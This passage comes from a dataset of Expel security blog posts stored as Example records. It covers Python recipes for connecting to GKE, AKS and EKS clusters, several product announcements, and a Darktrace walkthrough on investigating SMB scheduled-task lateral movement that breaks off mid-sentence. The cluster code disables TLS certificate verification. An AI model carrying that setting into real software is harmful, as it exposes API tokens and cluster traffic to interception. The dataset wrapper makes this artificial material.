possible as its not very accessible, is easy to misconfigure, and can be tough to audit. Managed k8s services have built-in authorization middleware we can use. Given that design, lets take a look at the recipes for GKE, AKS, and EKS. Connecting to Google Kubernetes Engine (GKE) How it works The recipe below uses a service account in GCP with a custom IAM role to access the Kubernetes API. In our view, Google has done a great job of making this simple and easy. The recipe takes advantage of existing Google SDKs to talk to the GCP control plane to get cluster details and an OAuth token for API access. Prerequisites A GCP service account (not a Kubernetes service account) with generated JSON credentials Service account must be assigned IAM permissions to get cluster details and read data in Kubernetes (this can be adjusted based on your use case) Network access to your clusters API endpoint Python example import logging import google.auth.transport.requests from google.cloud.container_v1 import ClusterManagerClient from google.cloud.container_v1 import GetClusterRequest from google.oauth2 import service_account import kubernetes.client # Update this to your cluster ID CLUSTER_ID = projects/kubernetes-integration-318317/locations/us-east1-b/clusters/gke-integration-test # Update this to your service account credentials file GOOGLE_CREDENTIALS = google_credentials.json logging.info( Retrieving cluster details , cluster_id=CLUSTER_ID) credentials = service_account.Credentials.from_service_account_file(GOOGLE_CREDENTIALS) req = GetClusterRequest(name=CLUSTER_ID) cluster_manager_client = ClusterManagerClient(credentials=credentials) cluster = cluster_manager_client.get_cluster(req) logging.info( Got cluster endpoint address , endpoint=cluster.endpoint) logging.info( Requesting an OAuth token from GCP ) kubeconfig_creds = credentials.with_scopes( [ https://www.googleapis.com/auth/cloud-platform , https://www.googleapis.com/auth/userinfo.email , ] , ) auth_req = google.auth.transport.requests.Request() kubeconfig_creds.refresh(auth_req) logging.info( Retrieved OAuth token for K8s API ) # Build endpoint string and token for K8s client api_endpoint = fhttps://{cluster.endpoint}: 443  api_token = kubeconfig_creds.token logging.info( Building K8s API client ) configuration = kubernetes.client.Configuration() configuration.api_key[ authorization ] = api_token configuration.api_key_prefix[ authorization ] = Bearer configuration.host = api_endpoint configuration.verify_ssl = False k8s_client = kubernetes.client.ApiClient(configuration=configuration) # Use K8s client to talk to Kubernetes API logging.info( Listing nodes in this Kubernetes cluster ) core_v1 = kubernetes.client.CoreV1Api(api_client=k8s_client) print ( Retrieved Nodes:\\n , core_v1.list_node()) Connecting to Azure Kubernetes Service (AKS) How it works The recipe below uses an Azure application registration and a custom Azure role. Like Google, Microsoft put some thought into the linkages between Azure IAM and AKS. However, theyve gone through multiple support iterations and offer several ways to do authentication and authorization for AKS . This can be confusing, and takes a lot of reading to figure out. Luckily, weve done all of that for you and can summarize. There are three ways to configure authN and authZ for AKS: Legacy auth with client certificates: Kubernetes handles authentication and authorization. Azure AD integration: Azure handles authentication, Kubernetes handles authorization. Azure RBAC for Kubernetes authorization: Azure handles authentication and authorization. We examined these options and recommend #3 for a few reasons: Your authentication and authorization policies will exist in one place (Azure IAM). Azure IAM RBAC is more user-friendly than in-cluster RBAC configurations. Azure roles are easier to audit than in-cluster rules. Based on these advantages, our Python recipe below authenticates with Azure, retrieves cluster details, and then requests an authentication token to communicate with the Kubernetes API. Prerequisites An Azure AD application registration Application must be assigned IAM permissions to get cluster details and read data in Kubernetes (this can be adjusted based on your use case) Network access to your clusters API endpoint Python example import requests import logging import kubernetes.client # Update these to auth as your Azure AD App TENANT_ID = YOUR_TENANT_ID CLIENT_ID = YOUR_CLIENT_ID CLIENT_SECRET = YOUR_CLIENT_SECRET # Update these to specify the cluster to connect to SUBSCRIPTION_ID = YOUR_SUBSCRIPTION_ID RESOURCE_GROUP = YOUR_RESOURCE_GROUP CLUSTER_NAME = YOUR_CLUSTER_NAME def get_oauth_token(resource):  Retrieve an OAuth token for the provided resource  login_url = https://login.microsoftonline.com/%s/oauth2/token % TENANT_ID payload = { grant_type : client_credentials , client_id : CLIENT_ID, client_secret : CLIENT_SECRET, Content-Type : x-www-form-urlencoded , resource : resource } response = requests.post(login_url, data=payload, verify=False).json() logging.info( Got OAuth token for AKS ) return response[ access_token ] logging.info( Retrieving cluster endpoint ) token = get_oauth_token( https://management.azure.com ) mgmt_url = https://management.azure.com/subscriptions/%s % SUBSCRIPTION_ID mgmt_url += /resourceGroups/%s % RESOURCE_GROUP mgmt_url += /providers/Microsoft.ContainerService/managedClusters/%s % CLUSTER_NAME cluster = requests.get(mgmt_url, params={ api-version : 2022-11-01 }, headers={ Authorization : Bearer %s % token} ).json() props = cluster[ properties ] fqdn = props.get( fqdn ) or props.get( privateFQDN ) api_endpoint = https://%s:443 % fqdn logging.info( Got cluster endpoint , endpoint=api_endpoint) logging.info( Requesting OAuth token for AKS ) # magic resource ID that works for all AKS clusters AKS_RESOURCE_ID = 6dae42f8-4368-4678-94ff-3960e28e3630 api_token = get_oauth_token(AKS_RESOURCE_ID) logging.info( Building K8s API client ) configuration = kubernetes.client.Configuration() configuration.api_key[ authorization ] = api_token configuration.api_key_prefix[ authorization ] = Bearer configuration.host = api_endpoint configuration.verify_ssl = False k8s_client = kubernetes.client.ApiClient(configuration=configuration) # Use K8s client to talk to Kubernetes API logging.info( Listing nodes in this Kubernetes cluster ) core_v1 = kubernetes.client.CoreV1Api(api_client=k8s_client) print ( Retrieved Nodes:\\n , core_v1.list_node()) Connecting to Amazon Elastic Kubernetes Service (EKS) How it works AWS clearly thought about the linkages for its cloud IAM service, but hasnt built as robust an integration as Google or Microsoft. The end result is less than ideal. As much as wed love to be able to keep authN and authZ management in AWS IAM, we currently dont have that ability without installing additional third-party tools like kiam (although these tools are quickly becoming obsolete ). For this recipe, well focus on whats possible with native EKS clusters and leave additional third-party tooling as an exercise for you, dear reader. The recipe below uses an AWS IAM role to generate a token for EKS, which is an unusual (and not well-documented) process compared to GKE and AKS. To generate a token, we call the STS service to generate a pre-signed URL. This returns a signature which EKS accepts as a token identifying the calling user. This token authenticates the user, but requires that we rely on in-cluster RBAC policies for authZ. Prerequisites IAM role with attached policies allowing access to get cluster details and contact the API IAM assumes role credentials are exported as environment variables AWS-auth configmap is updated to grant access to IAM role In-cluster RBAC roles and RoleBindings grant privileges to cluster resources Python example import base64 import boto3 import logging import kubernetes.client AWS_REGION = YOUR_AWS_REGION CLUSTER_NAME = YOUR_CLUSTER_NAME class TokenGenerator( object ):  Helper class to generate EKS tokens  def __init__(self, sts_client, cluster_name): self._sts_client = sts_client self._cluster_name = cluster_name self._register_cluster_name_handlers() def _register_cluster_name_handlers(self): self._sts_client.meta.events.register( provide-client-params.sts.GetCallerIdentity , self._retrieve_cluster_name, ) self._sts_client.meta.events.register( before-sign.sts.GetCallerIdentity , self._inject_cluster_name_header, ) def _retrieve_cluster_name(self, params, context, **kwargs): if ClusterName in params: context[ eks_cluster ] = params.pop( ClusterName ) def _inject_cluster_name_header(self, request, **kwargs): if eks_cluster in request.context: request.headers[ x-k8s-aws-id ] = request.context[ eks_cluster ] def get_token(self): Generate a presigned url token to pass to kubectl. url = self._get_presigned_url() token = k8s-aws-v1. + base64.urlsafe_b64encode( url.encode( utf-8 ), ).decode( utf-8 ).rstrip( = ) return token def _get_presigned_url(self): return self._sts_client.generate_presigned_url( get_caller_identity , Params={ ClusterName : self._cluster_name}, ExpiresIn=60, HttpMethod= GET , ) logging.info( Retrieving cluster endpoint ) eks_client = boto3.client( eks , AWS_REGION) resp = eks_client.describe_cluster(name=CLUSTER_NAME) api_endpoint = resp[ cluster ][ endpoint ] logging.info( Got cluster endpoint , endpoint=api_endpoint) logging.info( Retrieving K8s Token ) sts_client = boto3.client( sts, AWS_REGION) api_token = TokenGenerator(sts_client, CLUSTER_NAME).get_token() logging.debug( Got cluster token ) logging.info( Building K8s API client ) configuration = kubernetes.client.Configuration() configuration.api_key[ authorization ] = api_token configuration.api_key_prefix[ authorization ] = Bearer configuration.host = api_endpoint configuration.verify_ssl = False k8s_client = kubernetes.client.ApiClient(configuration=configuration) # Use K8s client to talk to Kubernetes API logging.info( Listing nodes in this Kubernetes cluster ) core_v1 = kubernetes.client.CoreV1Api(api_client=k8s_client) print ( Retrieved Nodes:\\n , core_v1.list_node()) Conclusion Our Workbench platform runs on Kubernetes. Weve been building on k8s for many years now and are excited to help organizations secure it. Kubernetes can be a bit intimidating, especially if you havent had hands-on experience. We hope by sharing our insight we can advance the state of Kubernetes security more generally and get security teams more involved. We cant wait to see what people build'}) (input_keys={'title'}),
  Example({'title': 'Introducing 24x7 monitoring and response for Google ...', 'url': 'https://expel.com/blog/24-7-monitoring-response-google-cloud-platform/', 'date': 'Jun 23, 2020', 'contents': 'Subscribe  EXPEL BLOG Introducing 247 monitoring and response for Google Cloud Platform Expel insider  1 MIN READ  PETER SILBERMAN  JUN 23, 2020  TAGS: Announcement / Managed detection and response / Selecting tech / Tools If you run any workloads on Google Cloud Platform (GCP), Ill bet you can identify with one of these scenarios: Youve got a multi-cloud strategy and recently migrated some data and workflows to GCP. Now its time to get serious about securing it. You use GCP but dont have a big enough team (or the right tech in place) to make sense of the regular barrage of GCP alerts and confusing river of logs. Youre playing catch up because your dev team is running a couple workflows on GCP that you recently learned about and now its time to secure them. Thats why Im excited to tell you that today were officially launching 247 monitoring and response services for GCP . We now provide security support for three of the major cloud service providers (CSPs): Amazon Web Services (AWS) , Microsoft Azure and GCP . Weve heard from our customers time and time again that they need a security partner that understands the nuances of each CSP and is willing to work with the customers cloud strategy and the security services they already have. Whether that involves a single CSP, multiple CSPs or a hybrid approach, they need one place to go to help sort through multiple environments, third-party integrations and logs with weak signals. Thats where we come in. Expel monitoring and response for GCP: How it works Expel secures your GCP environment with 247 monitoring and response. Expel integrates with both Googles Security Command Center and Operations (formerly StackDriver). Expel turns logs that represent suspicious/potentially interesting activity into alerts for our analysts to look at. Our Detection and Response engineering team spent the past six months researching various ways attackers can gain access, escalate privileges and steal data. We also have the benefit of talking to customers, learning about the risks they perceive and applying the lessons weve learned from monitoring Azure and AWS. Our research, customer conversations and experience with other CSPs all come together to form our approach to monitoring GCP. Need better cloud security? Lets chat. Whether youre running workloads on a few cloud platforms or just testing the waters with one, this page on our website sheds more light on the cloud platforms we support, along with what we monitor and how we do it. Want to learn more or talk to a real person? Send us a note.'}) (input_keys={'title'}),
  Example({'title': 'Introducing a mind map for AWS investigations', 'url': 'https://expel.com/blog/mind-map-for-aws-investigations/', 'date': 'Nov 17, 2020', 'contents': 'Subscribe  EXPEL BLOG Introducing a mind map for AWS investigations Security operations  2 MIN READ  DAVID BLANTON  NOV 17, 2020  TAGS: Cloud security / MDR Our SOC team remediates quite a few incidents in Amazon Web Services (AWS). Some of these were surprise attacks from red teams, while others were live attackers in our customers cloud environments. When running these incidents down, some common themes emerged about when and why attackers use different AWS APIs  and they mapped nicely to the MITRE ATT&amp;CK tactics. We noticed that these notes were really helpful when our analysts were investigating CloudTrail logs. So we captured these AWS APIs in a mind map and loaded it into our Expel Workbench. This mind map is a TL;DR of the attack paths an attacker may take once they gain access to an AWS environment. Why do we think youll find it useful? First, it can help analysts see the bigger picture during investigations, so they can quickly identify risk and possible compromise. Full disclosure, the AWS mind map doesnt cover every API call and the associated ATT&amp;CK tactic. But it can be a resource during incident response and, after remediation, can help you tell the story of what happened to the rest of your team or your customer. For example, lets say you find yourself responding to a GuardDuty alert for compromised EC2 credentials. While reviewing successful AWS API calls from the external source IP address and Amazon Resource Name (ARN), you spot API calls for CreateUser followed by PutUserPolicy and AttachUserPolicy after a series of Get*, Describe* and List* calls. If this were unauthorized activity, the mind map can help piece together that this may indicate automated reconnaissance in which an attacker created a privileged user to establish persistence in your environment. Weve also used the mind map to summarize red team engagements after weve chased them in a customers environment. We told the story of the engagement by filling in a blank mind map with what APIs the red team used during their engagement. And these are just some examples of how the Expel AWS mind map has already been incredibly useful to us. We hope this resource will be helpful to you if you ever find yourself chasing a bad guy through the cloud. In addition to the mind map, weve created a cheat sheet for how to use and get the most out of the mind map, along with a blank mind map that you can use during your investigations. Click here to get our AWS mind map kit sent directly to your email inbox!'}) (input_keys={'title'}),
  Example({'title': 'Introducing Expel for phishing', 'url': 'https://expel.com/blog/introducing-expel-for-phishing/', 'date': 'Oct 13, 2020', 'contents': 'Subscribe  EXPEL BLOG Introducing Expel for phishing Expel insider  2 MIN READ  PETER SILBERMAN  OCT 13, 2020  TAGS: Company news / MDR If youve worked in cybersecurity for a hot second, then you know crafty attackers are always busy dreaming up new ways to compromise your org  whether its through your AWS environment or man-in-the-middle-ing your CEOs credentials. Yet one of the oldest (and still effective) tricks in the book for getting inside an org is through its employees inboxes. Yep, were talking about phishing. Chances are, youve invested time to train your employees to have a keen eye for suspicious emails. If youve been successful, theyre slamming that phish button every time a malicious email lands in their inbox. And your phishing simulations are seeing good success rates. Huzzah! And now your team needs to review and investigate every single one of those emails that are reported. *Record scratch* Its time consuming, tedious and its keeping your talented analysts from focusing on the more strategic security work you hired them to do. Finding ways to triage an abundance of phishing emails while still keeping your analysts happy and engaged isnt an easy task. In fact, we hear it all the time from our customers that its something they struggle with. Which is exactly why we created Expel for Phishing. How Expels managed phishing service works There are plenty of products out there to help triage phishing emails. So what makes us different? While other phishing products also surface emails they believe to be phishing, they typically stop there. But Expel takes it a step further. Our analysts have eyes on every email that is either directly forwarded to us or is delivered through a report phishing button. From there, we determine if the email is indeed a legitimate phishing attempt. And then Expel for Phishing keeps going. When we find an email thats a phishing attack, we use your endpoint detection and response (EDR) tool to see what the user did, if theyre compromised and if anyone else clicked on the email. From there, we provide you with a detailed report that includes remediation recommendations  including exactly which employees clicked on the malicious email and what you need to do to shut those attackers down. If youre more of a visual learner, heres a peek at the process we just described: Expel managed phishing process Like any other services from Expel, our analysts keep you in the loop throughout the investigation and remediation processes through a dedicated Slack channel and the Expel Workbench. Drowning in phishing emails? Let us throw you a line. Were excited to help orgs of all shapes and sizes manage their phishing emails, letting their security teams get back to focusing on the security work they love. If youd like to find out more, check out our Expel for phishing page .'}) (input_keys={'title'}),
  Example({'title': 'Introducing Expel Vulnerability Prioritization: our new ...', 'url': 'https://expel.com/blog/introducing-expel-vulnerability-prioritization-our-new-solution-for-helping-identify-the-highest-risk-vulnerabilities/', 'date': 'Apr 20, 2023', 'contents': 'Subscribe  EXPEL BLOG Introducing Expel Vulnerability Prioritization: our new solution for helping identify the highest-risk vulnerabilities Security operations  3 MIN READ  MATT PETERS  APR 20, 2023  TAGS: MDR In ancient Greece there was a monster called a Lernean Hydra. It had nine heads and, if you cut one off, two more grew in its place. Between that, Sisyphus endlessly rolling a rock up a hill, and Prometheus chained to a rock perpetually being eaten by vultures, the ancient Greeks sure had a deep bench of unending torments. Fast forward to today. In 2014, NIST had to add a digit to the CVE format because the number of vulnerabilities discovered in a calendar year could no longer be counted with 4 digits. The number has only grownthere were over 26 thousand vulnerabilities reported in 2022! But we cant just put our heads in the sand. According to a recent Forrester report , software vulnerabilities are the second-most reported attack vector. There has got to be something we can do. Figuring out which vulnerabilities matter most is important, but hugely difficult. Static methods like the Common Vulnerability Scoring System (CVSS) dont solve the whole problem because they dont take into account dynamic factors impacting the likelihood of exploitthings like is there a public version? and do we have a compensating control? are all things you may need to consider. Even if you do something like just patch the criticals, the problem is still intractably huge those increased by 59% in 2022 . You may also be challenged because your team may not fully own the vulnerability management process. Other stakeholders may include risk management, IT operations, or line of businessand there may be multiple teams within IT based on who owns the technology where the vulnerabilities exist. Because multiple teams share the vulnerability remediation process, its often difficult to coordinate the metrics and tracking of fixes. In some cases, organizations might not even get better security outcomes. For example, some organizations have goals around remediating a specific number or percentage of vulnerabilities, without qualifying whether those vulnerabilities pose an actual threat to the business. Here we find ourselvesfighting a monster or chained to a rockpick your favorite ancient Greek torment. We have to do something and, as a first step, we want to figure out how to prioritize better. Thats why were now offering Expel Vulnerability Prioritization , our newest managed service that takes the burden off security teams by doing the triage and investigation of unresolved security issues for themto identify the vulnerabilities that are putting customers at the highest level of risk. If youre using a Tenable or Rapid7 vulnerability management solution, then Expel Vulnerability Prioritization is for you. We take these solutions a step further, accelerating your remediation process by letting you know exactly which vulnerabilities detected pose the greatest risk. By connecting the dots between your Tenable or Rapid7 on-prem vulnerability data, and priority assets in your Expel Managed Detection and Response (MDR) environment, we assess your risk and the potential impact of your vulnerabilities against external threat intel and what attackers are actually exploiting in the wild. You get a prioritized list of vulnerabilities with recommendations on next steps for immediate action. This reduces the burden on your SecOps and IT teams with: Risk-based prioritization, by matching internal context for the risk with the degree of exploitability A dedicated team to investigate and provide guidance A clear assessment and prompt reporting of criticality and potential impact if the issue stays unresolved Expel Vulnerability Prioritization employs a risk-based prioritization model that starts with ingesting endpoint vulnerability scanner data from Tenable.io Vulnerability Management and Rapid7s InsightVM. We then match that data to external threat intelligence, and what our SOC is seeing across our MDR customers environments to get more context and narrow down the list of vulnerabilities most likely to impact your organization. Like all Expel products, we use a software-first approach, ingesting information from your existing security devices and technology, and applying our own automations (or bots) to investigate and triage. Then our Vulnerability Analysts further investigate and analyze to qualify what vulnerabilities are urgent, and whats recommended for remediation during the next patching cycle. Our team then notifies you about urgent and recommended vulnerabilities with remediation guidance. Heres another look at our risk-based prioritization model: Expel Vulnerability Prioritization aims to accelerate your prioritization and remediation process so you can improve visibility and decision-making, spend less time triaging and investigating vulnerabilities, and more time patching. It can also strengthen your detection and response processes by shutting down attack vectors that could be exploited. Expel Vulnerability Prioritization is another solution powered by our security operations platform, Expel Workbench , complementing our market-leading MDR, phishing, and threat hunting offerings. We enable you to take a proactive approach to investigation and remediation, and eliminate critical risks early in the cybersecurity kill chain. If youre attending the RSA Conference in San Francisco next week, feel free to stop by for a demo at booth #954 in the South Hall. If youre not going to RSA, feel free to contact us for more details.'}) (input_keys={'title'}),
  Example({'title': 'Introducing Expel Workbench for Amazon Web Services ...', 'url': 'https://expel.com/blog/expel-workbench-for-amazon-web-services/', 'date': 'Feb 1, 2021', 'contents': 'Subscribe  EXPEL BLOG Introducing Expel Workbench for Amazon Web Services (AWS) Expel insider  3 MIN READ  PETER SILBERMAN  FEB 1, 2021  TAGS: Cloud security / MDR / Tech tools If youre a growing company that was born in the cloud, revenue, uptime, new features and innovation are likely some of the big priorities driving your org. If you had time (and a little forethought) while you were busy building you mightve baked some security into your CI/CD pipeline. But monitoring security alerts for your application thats running in AWS isnt exactly at the top of your to-do list  until one of your big customers (or lawyers or auditors) start asking pointed questions about how youre monitoring and securing their data in AWS. Sound familiar? At this point, most of the customers we work with started asking themselves a few questions: How do I detangle this confusing (and ever-changing) array of AWS services, CloudTrail logs and alerts? Where can I find someone (or the budget to hire someone) who can sift through AWS security alerts and tell me which ones are real risks? Whats the playbook for investigating and fixing AWS security alerts? Then they set out in search of a product to help  and waded through miles of marketing fluff and ended up more than a little irked. An easy button for AWS security The scenario (and frustration) I describe above  which weve heard from orgs in all sorts of industries  is what inspired us to create Expel Workbench for AWS. We think of it as an easy button to monitor and investigate potential security risks in your AWS environment. It takes all of your AWS logs and alerts and tells you which ones are real risks (and why all the others arent). How it works: Expel Workbench only surfaces Expel-validated alerts. Our ability to validate alerts is based on the experience of our SOC analysts whove run thousands of investigations in AWS environments. Expel Workbench also comes with our bot, Ruxie, who automatically investigates alerts and gathers additional information before surfacing them up to you, so youve got data you need to make quick and accurate decisions. In addition to gotta-fix-that-now alerts like databases going public or compromised instance credentials, Expel Workbench also tells you when there are interesting things like risky authentications or unusual IAM policy changes that may not be immediate risks but are probably something you want to know about. We dont just rely on AWS GuardDuty, we surface observations and correlations out of your CloudTrail Logs too . By filtering out false positives and enriching the alerts that matter with investigative details like where the user has authenticated from in the past 45 days or what APIs the AWS role has been observed making in the past 30 days, Expel Workbench shrinks the time it takes you to confirm if an alert is truly something you and your team need to look into. How Expel Workbench for AWS makes your life (and your teams) easier If security is something you do when youve got time or the thought of hiring (and retaining) a team of AWS security analysts makes you want to run away screaming, its a good bet that Expel Workbench can help. How? With Expel Workbench, youll: Become an expert AWS investigator and be able to perform advanced investigations and incident response with a base-level of AWS expertise. Itll tell you what you need to look at and provide guides on how to respond. Spend less time detecting and more time fixing security risks because it automates alert review and adds investigative details. Youll have more time back so you can put new security controls in place that prevent security issues. Avoid buying more tools because you dont need to string together lots of tools to process, analyze and respond to AWS security alerts (and then figure out and train your team on how to use them). Avoid hiring a squad of cloud security gurus who are difficult to find in the first place. Weve got that covered. Sound like something that would help your org? Wed love to answer your burning questions. Check out our Expel Workbench for AWS page to learn more, or start a free trial.'}) (input_keys={'title'}),
  Example({'title': 'Investigating Darktrace alerts for lateral movement', 'url': 'https://expel.com/blog/investigating-darktrace-alerts-for-lateral-movement/', 'date': 'Jun 21, 2018', 'contents': 'Subscribe  EXPEL BLOG Investigating Darktrace alerts for lateral movement Tips  10 MIN READ  TYLER FORNES  JUN 21, 2018  TAGS: Darktrace / Example / Get technical / Tools Expel analysts get to use a lot of really cool technology including Darktrace and Carbon Black (Cb Response). Its one of the perks of delivering a service that integrates with so many tools. Each product we use is critical to an investigation. But they provide value in different ways. For example, some help us detect, while others are more valuable when were scoping an investigative lead. Whats an investigative lead you say? Well  thats basically how we think of alerts. And we see our job as following the trail of those leads so we can give our clients answers. For this, we rely on an investigative mindset  which we apply to all of the network, endpoint and SIEM products we use during an investigation. In this post, Im going to focus on Darktrace. Ill highlight some of our favorite features and then dive into a typical investigation to show you how our analysts triage a Darktrace alert. In this case, well be looking at an anomalous connection that Darktrace identified and Ill share some of the investigative techniques we commonly use to filter down the available data. A quick overview of Darktrace If youre not familiar with Darktrace, there are a few things you should know. First and foremost, its a far cry from your traditional IDS/IPS. In fact, Darktrace is completely signatureless. Instead, it creates a model of what normal network activity looks like for your organization. When network traffic deviates from that model, Darktrace flags it as suspicious activity. Then, Darktrace tunes these models with machine learning and artificial intelligence and enriches the involved hosts with Active Directory information to add some pretty cool dynamic asset identification and tracking. This means it can identify true hostname and OS information of the involved hosts to help an analyst confirm abnormal network behavior. These features make Darktrace different from a lot of other detection-centric network security tools because its looking for behaviors you see during a compromise instead of specific indicators. Its important to understand the ins and outs of Darktraces detection approach because it changes the way you triage those alerts. In short, you can think of Darktrace alerts as high-fidelity initial leads (for example, an anomalous connection / POST to PHP on a new external host) versus something more tactical and specific (like a Snort signature for a string in a specific PHP webshell). Both will likely detect the same known-bad activity. However, the Darktrace alert will likely detect far more unknown-bad since were not relying on constantly updated signatures to keep up with attacker TTPs. In any case, abnormal network events that are identified by Darktraces Enterprise Immune System are labeled as model breaches since theyre activity that has breached the known model of your network. Thats why we think of these alerts as initial leads. Theres something there  but it needs a little more looking into to understand exactly what it is. Fortunately, Darktrace provides a bunch of features to make this easy. Our favorite Darktrace features There are a ton of neat features in Darktrace. But if we had to pick three that our analysts find the most helpful in their day-to-day investigations it would be these: Advanced log search: Bro logs generated by Darktrace are indexed and accessible via a Kibana-like query structure. This allows us to quickly and efficiently scope an incident or hunt for threats across the entire organization without the need for exhaustive data collection and manual parsing by an analyst. Full packet capture: Custom, full packet captures can be quickly generated based on time and involved IPs. These on-demand packet captures are great for uncovering additional evidence thats tailored, only including the required data and eliminating the need to filter large packet capture offline. Asset identification: Assets Darktrace identifies are enriched with Active Directory (AD) information including DNS hostname. You even have the option to customize tags to make valuable assets easier to identify. This feature helps analysts make quick decisions about the severity of a model breach assists in determining what further evidence may be available. Detecting and investigating lateral movement with Darktrace Attacks carried out by advanced attackers have one thing in common  lateral movement. Thats because attackers almost never land on the box that has the data theyre after. To complete their mission they need to navigate to the endpoint where their desired data lives (that is, theyve got to move laterally). There are only a few ways to do it and it can be difficult to spot with traditional network and endpoint tools. Thats why its a natural choke point when youre detecting and investigating attacks (to learn more, check out the MITRE ATT&amp;CK framework, which catalogs all of the ways attackers can move laterally ). Darktraces approach is well suited to uncover lateral movement. So lets dive into a Darktrace model breach and look at how some of Darktraces key features help us effectively investigate a lateral movement technique that can be difficult to analyze using traditional IDS. The technique well be examining is remote file copy over SMB . Getting the lay of the land: the Darktrace search page Before we dive into the alert its helpful to understand whats going on behind the scenes in Darktrace. As you can imagine, SMB traffic is extremely common on most networks. That can make hunting through all the data a challenge  especially in a large environment. Fortunately, Darktrace has a few advanced search features that can help us. From the Darktrace homepage, lets navigate to the advanced search page. This is the view where I like to do most of my analysis. Essentially, its a Kibana-like representation of the Bro data that Darktrace has indexed. If youre a security analyst, this is the view where youll run most of your queries to scope an alert, investigate or hunt. In this case, since we want to specifically investigate SMB traffic in the environment, lets select a timeframe of last 15 minutes and select the @type field. The type field allows us to tap into Darktrace analytics and see a table organized by the most commonly seen network protocols. Selecting the terms button, will give you to a complete list of this data. Since were focusing on malicious file copy/execution via SMB, lets check out the smb_readwrite category, since its where Id expect to find this type of activity. As you can see, Darktrace does a really great job of parsing and stacking the Bro logs so its easy for an analyst to start identifying malicious activity. By applying a simple filter of @type:smb_readwrite and *.exe (or @type:smb_readwrite AND @fields.mime:application/x-dosexec to search by MIME type) we can identify any obviously named executables being transferred via SMB in a given timeframe. Wed expect to see a lot of legitimate traffic in these results since many enterprise applications handle deployment, updates and other administrative functions over the SMB protocol. As the screenshot below shows (not all results shown), were seeing CarbonBlackClientSetup.exe being transferred over SMB quite a bit in this environment. The high volume of activity combined with the large number of unique hosts involved means we can infer this is probably the result of legitimate admin activity, rather than an advanced attacker attempting to move stealthily through the environment. In reality, this would be a pretty exhausting way to find malicious SMB transfers. But its a good, simple example of how we can use the Darktraces analysis features to start identifying malicious connections in an environment. OK. Now that weve learned how to use some of Darktraces more advanced analysis features, lets apply this knowledge to a Darktrace alert. Investigating a Darktrace alert Benign alerts are one of the most challenging types of alerts for a security analyst to triage. Theyre also tricky to define. Here at Expel, we define benign alerts as ones where something matches the intention of the signature, but  after further investigation and gathering additional context  arent indicative of a security incident. Since attackers often use legitimate tools, it usually boils down to concluding that a legitimate tool is, in fact, being used legitimately. As mentioned before, Darktraces Enterprise Immune System requires a learning period to identify whats normal (and thus whats not normal). Knowing this, we can assume that abnormal user traffic will likely trigger model breaches as the Enterprise Immune System begins to learn and identify events that match attacker behavior, even if theyre the result of legitimate user activity. Step one: interpreting the model breach Staying with this thread of remote file execution via SMB, we can see this Darktrace alert was triggered via a violation of one of the pre-packaged model breaches for Device / AT Service Scheduled Task. To triage this specific alert appropriately, we need to know answers to the following questions: What were the triggers that caused the model to alert? Which host was the Scheduled Task created on? Were any files transferred? Is this activity commonly seen between these hosts? If we can answer these questions, we should be able to confidently determine whether or not this alert is related to malicious activity. But first, we need to gather additional evidence using the Darktrace console. So where do we start? In my experience, its always best to start with what you know. At this point, we only know that the model breach Device / AT Service Scheduled Task has been triggered. But how do we know exactly what that means? Lets view the model and explore the logic. Looking at the logic behind this model breach, we can see that any message containing the strings atsvc and IPC$ will match this model breach. Since the frequency has been set to &gt; 0 in 60 mins we can also assume that once this activity is seen exactly one time, itll trigger an alert. By understanding this logic, we now know: Step two: chasing the initial lead Now that we know what were looking for, lets go grab some data. First, lets explore the Bro log messages that triggered this model. To do this, open up the Model Breach Event Log. This shows us the related events that were observed for this model breach. As you can see below, there was a successful DCE-RPC bind, followed by SMB Write/Read success containing the keywords atsvc and ICP$ . This is helpful. However, were interested in the surrounding context of these events. The quickest way to see this is to use the View advanced search for this event feature of the Model Breach Event Log as shown below. Look familiar? Welcome back to the advanced search console. Now, lets dig into the activity a bit more. As we discussed before, we know this model represents a common lateral movement technique using remotely scheduled tasks. By checking out the advanced search results for this model breach, we can get a better look into the context surrounding this activity. First, when we browse through the messages before and after the model breach alert, two distinct messages stand out. First, we see a successful NTLM authentication message for the account appadmin . Since NTLM is commonly used with SMB for authentication, we can infer this is likely the account being used by the source machine to establish the SMB session. Immediately after this authentication we can see the following DCE-RPC message for a named pipe being created involving atsvc: As highlighted in the above screenshot, we can also see that the RPC bind was created referencing the SASec interface . Using online resources to validate, we learned that the SASec interface only includes methods for manipulating account information, because most SASec-created task configuration is stored in the file system using the .JOB file format ( https://msdn.microsoft.com/en-us/library/cc248269.aspx ). What does that tell us? Well, we can infer that one possible explanation for this connection was that it was made to query information about a scheduled task defined within the .JOB format, rather than a new scheduled task being created on the host. However, within this model breach Darktrace doesnt show any messages mentioning a file with the extension .JOB. This is where we can put the Darktrace advanced search back to work to find us some answers. By querying *.JOB AND SMB within the timeframe of the activity weve already observed, some promising results start to appear. As shown above, we observe three unique .JOB files being accessed over SMB during the exact time of our previous observations. Considering the hosts and the timeframe, we can correlate this activity to the original model breach. With this observation, lets consider what we know so far: Step three: scoping additional evidence So you might be asking yourself at this point, How can we definitely prove this is non-malicious activity with only network data? Well, its time to yet-again harness the power of Darktraces advanced search for some scoping fun. Lets take a second to consider what this activity would look like if it was malicious. AT jobs over SMB are used to execute something on a remote host. This means scheduling a task to run a malicious binary and establish persistence one time . However, we know that frequently in an enterprise environment, SMB is used for reading/writing files for the purpose of benign client-server communication. The frequency of such activity would be harder to identify without a quick way to query terabytes of log data, but with Darktrace we can scope months worth of records to analyze the frequency of such connections to identify anomalies within seconds. Lets take one of our pieces of evidence AV.job and create a simple query to understand how frequently this activity occurs. Using the query AV.job AND smb over the past 60 days, the advanced search returns daily entries for identical activity going all the way back to April sixth. Notice, the activity occurs around the same time each day, involving the same hosts and file paths (data truncated for screenshot purposes). Step four: Validation via packet analysis As an analyst, this is starting to smell like legitimate administrative activity to me. But the remaining sliver of doubt that I have lies within the ability to analyze the contents of the requested file AV.job . One of the other great features of Darktrace is its full packet capture capability. With this, we are able to grab a custom PCAP based on the data observed in a model breach, or at random by specifying a source IP address and timeframe of interest. Using this capability, I created a packet capture for a five-minute window around the timeframe of the source IP address observed in the model breach. Once I collected the PCAP, I downloaded and analyzed it in Wireshark. Fortunately, Wireshark was able to extract transferred files within this SMB session using the Export Objects feature. Using a hex editor, we can see the contents of AV.job . As you can see, the contents of this file refer to an executable in the location C:Program FilesSophosSophos Anti-VirusBackgroundScanClient.exe. Judging by the name of the .JOB file this was found in, we can infer its likely a legitimate scheduled task created to perform an antivirus scan on the endpoint each morning. This doesnt rule out the possibility this binary has been replaced with a malicious executable with the same name/path. But as far as network evidence goes, Darktrace has helped us 